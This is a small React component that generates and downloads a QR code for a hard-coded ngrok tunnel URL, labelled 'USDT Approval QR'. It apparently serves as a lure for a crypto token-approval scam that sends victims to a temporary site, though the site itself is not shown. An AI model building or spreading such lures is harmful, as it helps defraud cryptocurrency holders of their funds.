import { useState } from "react";
import QRCode from "qrcode";
import "./App.css";

export default function App() {
  const [qr, setQr] = useState("");

  const websiteUrl =
    "https://reversing-reliant-scavenger.ngrok-free.dev/";

  const generateQR = async () => {
    const dataUrl = await QRCode.toDataURL(websiteUrl);
    setQr(dataUrl);
  };

  const downloadQR = () => {
    const link = document.createElement("a");
    link.href = qr;
    link.download = "usdt-approval-qr.png";
    link.click();
  };

  return (
    <div className="container">
      <div className="card">
        <h2>USDT Approval QR</h2>

        <button
          className="generate-btn"
          onClick={generateQR}
        >
          Generate QR Code
        </button>

        {qr && (
          <>
            <img
              src={qr}
              alt="QR Code"
              className="qr-image"
            />

            <button
              className="download-btn"
              onClick={downloadQR}
            >
              Download QR
            </button>
          </>
        )}
      </div>
    </div>
  );
}
